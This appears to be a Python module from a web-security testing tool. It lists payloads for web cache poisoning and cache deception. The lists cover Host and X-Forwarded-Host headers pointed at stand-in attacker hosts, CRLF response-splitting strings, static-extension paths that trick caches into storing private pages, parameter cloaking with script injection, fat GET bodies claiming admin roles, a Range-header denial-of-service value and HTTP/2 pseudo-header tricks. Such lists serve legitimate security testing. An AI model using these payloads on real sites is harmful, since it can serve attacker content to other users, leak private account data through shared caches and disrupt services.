"""
Web Cache Poisoning Payloads

Payloads for cache poisoning attacks including:
- HTTP header cache key confusion
- Host header attacks
- Cache key manipulation
- Response splitting
"""

# Cache poisoning via HTTP headers
CACHE_POISON_HEADERS = [
    {
        "name": "X-Forwarded-Host",
        "payload": "evil.com",
        "description": "X-Forwarded-Host cache confusion",
    },
    {
        "name": "X-Forwarded-Host",
        "payload": "www.evil.com",
        "description": "X-Forwarded-Host with www subdomain",
    },
    {
        "name": "X-Host",
        "payload": "attacker.com",
        "description": "X-Host header injection",
    },
    {
        "name": "X-Original-URL",
        "payload": "http://evil.com/",
        "description": "X-Original-URL manipulation",
    },
    {
        "name": "X-Original-Host",
        "payload": "evil.com",
        "description": "X-Original-Host poisoning",
    },
    {
        "name": "X-Forwarded-Server",
        "payload": "evil.com",
        "description": "X-Forwarded-Server poisoning",
    },
    {
        "name": "Host",
        "payload": "evil.com",
        "description": "Direct Host header poisoning",
    },
    {
        "name": "X-Real-IP",
        "payload": "1.2.3.4",
        "description": "X-Real-IP cache poisoning",
    },
    {
        "name": "X-Forwarded-For",
        "payload": "evil.com",
        "description": "X-Forwarded-For origin poisoning",
    },
]

# Cache key poisoning via user agent
CACHE_POISON_USER_AGENTS = [
    {
        "name": "evil_user_agent",
        "payload": "Mozilla/5.0 (Poisoned Cache)",
        "description": "User-Agent cache key poisoning",
    },
    {
        "name": "random_user_agent",
        "payload": "EvilBot/1.0 (+http://evil.com/bot)",
        "description": "User-Agent with URL for cache poisoning",
    },
]

# CRLF injection for response splitting
CRLF_INJECTION_PAYLOADS = [
    {
        "name": "basic_crlf",
        "payload": "\r\nX-Cache-Control: public\r\n",
        "description": "Basic CRLF injection",
    },
    {
        "name": "header_injection",
        "payload": "\r\nSet-Cookie: evil=1\r\n",
        "description": "Header injection via CRLF",
    },
    {
        "name": "cache_split",
        "payload": "\r\nCache-Control: public, max-age=31536000\r\n",
        "description": "Cache control splitting",
    },
    {
        "name": "status_split",
        "payload": "\r\nHTTP/1.1 200 OK\r\n",
        "description": "Status line splitting",
    },
    {
        "name": "content_length_split",
        "payload": "\r\nContent-Length: 0\r\n",
        "description": "Content-Length splitting",
    },
]

# Cache key collision via unkeyed headers
CACHE_UNKEYED_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Original-URL",
    "Accept-Encoding",
    "Accept-Language",
]

# Cache deception payloads
CACHE_DECEPTION = [
    {
        "name": "cache_control_override",
        "payload": "Cache-Control: public, max-age=31536000",
        "description": "Force cache override",
    },
    {
        "name": "etag_manipulation",
        "payload": "If-None-Match: 'invalid-etag'",
        "description": "ETag manipulation for cache bypass",
    },
    {
        "name": "last_modified",
        "payload": "If-Modified-Since: Sun, 01 Jan 1970 00:00:00 GMT",
        "description": "Last-Modified cache bypass",
    },
    {
        "name": "pragma_no_cache_bypass",
        "payload": "Pragma: no-cache",
        "description": "Pragma header manipulation",
    },
]

# Method-based cache poisoning
CACHE_POISON_METHODS = [
    {
        "name": "head_cache",
        "payload": "HEAD",
        "description": "HEAD method cache poisoning",
    },
    {
        "name": "options_cache",
        "payload": "OPTIONS",
        "description": "OPTIONS method cache poisoning",
    },
]

# Vary header exploitation
VARY_HEADER_ATTACKS = [
    {
        "name": "vary_user_agent",
        "payload": "User-Agent: Mozilla/5.0 (CachePoison)",
        "description": "Vary header User-Agent poisoning",
    },
    {
        "name": "vary_accept_encoding",
        "payload": "Accept-Encoding: gzip, deflate",
        "description": "Vary header Accept-Encoding poisoning",
    },
]

# CDN-specific cache poisoning
CDN_CACHE_POISON = [
    {
        "name": "cloudflare_cache",
        "payload": "cf-ray: poisoned",
        "description": "Cloudflare cache key poisoning",
    },
    {
        "name": "akamai_cache",
        "payload": "Akamai-Cache-Control: public",
        "description": "Akamai cache poisoning",
    },
]

# Success indicators for cache poisoning
CACHE_POISON_SUCCESS = [
    "evil.com",
    "attacker.com",
    "Set-Cookie: evil",
    "<script>alert(1)</script>",
    "X-Cache-Control: public",
]

# Web cache deception path payloads
CACHE_DECEPTION_PATHS = [
    {
        "name": "css_suffix",
        "payload": "/account/settings.css",
        "description": "CSS extension for cache deception",
    },
    {
        "name": "js_suffix",
        "payload": "/profile/data.js",
        "description": "JS extension for cache deception",
    },
    {
        "name": "png_suffix",
        "payload": "/api/user/me.png",
        "description": "PNG extension for cache deception",
    },
    {
        "name": "jpg_suffix",
        "payload": "/dashboard.jpg",
        "description": "JPG extension for cache deception",
    },
    {
        "name": "gif_suffix",
        "payload": "/settings/profile.gif",
        "description": "GIF extension for cache deception",
    },
    {
        "name": "ico_suffix",
        "payload": "/account.ico",
        "description": "ICO extension for cache deception",
    },
    {
        "name": "woff_suffix",
        "payload": "/user/data.woff",
        "description": "WOFF font extension",
    },
    {
        "name": "svg_suffix",
        "payload": "/api/sensitive.svg",
        "description": "SVG extension for cache deception",
    },
    {
        "name": "semicolon_bypass",
        "payload": "/account;.css",
        "description": "Semicolon path parameter bypass",
    },
    {
        "name": "encoded_dot",
        "payload": "/account%2e.css",
        "description": "URL encoded dot bypass",
    },
    {
        "name": "double_extension",
        "payload": "/account.php.css",
        "description": "Double extension cache deception",
    },
    {
        "name": "null_byte",
        "payload": "/account%00.css",
        "description": "Null byte extension bypass",
    },
]

# Parameter cloaking/pollution for cache poisoning
PARAMETER_CLOAKING = [
    {
        "name": "semicolon_param",
        "payload": "?cb=123;evil=<script>alert(1)</script>",
        "description": "Semicolon as parameter separator",
    },
    {
        "name": "duplicate_param",
        "payload": "?param=safe&param=<script>alert(1)</script>",
        "description": "Duplicate parameters (HPP)",
    },
    {
        "name": "encoded_ampersand",
        "payload": "?cb=123%26evil=injected",
        "description": "URL encoded ampersand",
    },
    {
        "name": "null_byte_param",
        "payload": "?cb=123%00evil=injected",
        "description": "Null byte parameter cloaking",
    },
    {
        "name": "unicode_separator",
        "payload": "?cb=123\uff06evil=injected",
        "description": "Unicode fullwidth ampersand",
    },
    {
        "name": "array_pollution",
        "payload": "?param[]=safe&param[]=evil",
        "description": "Array parameter pollution",
    },
    {
        "name": "json_param",
        "payload": "?data={\"evil\":\"<script>alert(1)</script>\"}",
        "description": "JSON in query parameter",
    },
]

# Fat GET payloads (body in GET request)
FAT_GET_PAYLOADS = [
    {
        "name": "fat_get_json",
        "method": "GET",
        "body": '{"admin": true, "role": "superuser"}',
        "content_type": "application/json",
        "description": "Fat GET with JSON body",
    },
    {
        "name": "fat_get_form",
        "method": "GET",
        "body": "admin=true&role=superuser",
        "content_type": "application/x-www-form-urlencoded",
        "description": "Fat GET with form body",
    },
    {
        "name": "fat_get_xml",
        "method": "GET",
        "body": "<user><admin>true</admin></user>",
        "content_type": "application/xml",
        "description": "Fat GET with XML body",
    },
]

# Range header cache poisoning
RANGE_HEADER_ATTACKS = [
    {
        "name": "range_dos",
        "payload": "bytes=0-0,-1",
        "description": "Range header DoS via overlapping ranges",
    },
    {
        "name": "range_fragment",
        "payload": "bytes=0-100",
        "description": "Partial content caching",
    },
    {
        "name": "range_negative",
        "payload": "bytes=-500",
        "description": "Suffix range request",
    },
    {
        "name": "range_invalid",
        "payload": "bytes=abc-xyz",
        "description": "Invalid range for error caching",
    },
]

# Accept-Encoding manipulation
ACCEPT_ENCODING_ATTACKS = [
    {
        "name": "invalid_encoding",
        "payload": "Accept-Encoding: evil",
        "description": "Invalid encoding value",
    },
    {
        "name": "xss_encoding",
        "payload": "Accept-Encoding: gzip<script>alert(1)</script>",
        "description": "XSS in Accept-Encoding",
    },
    {
        "name": "deflate_poison",
        "payload": "Accept-Encoding: deflate, evil",
        "description": "Multiple encoding with injection",
    },
    {
        "name": "identity_poison",
        "payload": "Accept-Encoding: identity;q=0.5, evil;q=1",
        "description": "Quality value manipulation",
    },
]

# HTTP/2 specific cache poisoning
HTTP2_CACHE_POISON = [
    {
        "name": "h2_pseudo_path",
        "payload": ":path: /admin",
        "description": "HTTP/2 pseudo-header path manipulation",
    },
    {
        "name": "h2_pseudo_authority",
        "payload": ":authority: evil.com",
        "description": "HTTP/2 authority manipulation",
    },
    {
        "name": "h2_pseudo_scheme",
        "payload": ":scheme: https",
        "description": "HTTP/2 scheme manipulation",
    },
    {
        "name": "h2_duplicate_pseudo",
        "payload": ":path: /safe\r\n:path: /admin",
        "description": "Duplicate HTTP/2 pseudo-headers",
    },
]

# Request coalescing attacks
REQUEST_COALESCING = [
    {
        "name": "coalesce_host",
        "headers": {"Host": "target.com", "X-Forwarded-Host": "evil.com"},
        "description": "Host header coalescing",
    },
    {
        "name": "coalesce_origin",
        "headers": {"Origin": "https://evil.com", "X-Original-URL": "/admin"},
        "description": "Origin coalescing attack",
    },
]

# Cache key injection via special characters
CACHE_KEY_INJECTION = [
    {
        "name": "newline_key",
        "payload": "param=value%0d%0aX-Injected: header",
        "description": "Newline injection in cache key",
    },
    {
        "name": "tab_key",
        "payload": "param=value%09injected",
        "description": "Tab character in cache key",
    },
    {
        "name": "backslash_key",
        "payload": "param=value\\..\\admin",
        "description": "Path traversal in cache key",
    },
    {
        "name": "unicode_normalization",
        "payload": "param=%e2%80%8b",
        "description": "Zero-width space cache key confusion",
    },
]

# Combined payload list for easy iteration
ALL_CACHE_POISON_PAYLOADS = (
    CACHE_POISON_HEADERS +
    CACHE_POISON_USER_AGENTS +
    CRLF_INJECTION_PAYLOADS +
    CACHE_DECEPTION +
    CACHE_POISON_METHODS +
    VARY_HEADER_ATTACKS +
    CDN_CACHE_POISON +
    CACHE_DECEPTION_PATHS +
    PARAMETER_CLOAKING +
    FAT_GET_PAYLOADS +
    RANGE_HEADER_ATTACKS +
    ACCEPT_ENCODING_ATTACKS +
    HTTP2_CACHE_POISON +
    REQUEST_COALESCING +
    CACHE_KEY_INJECTION
)
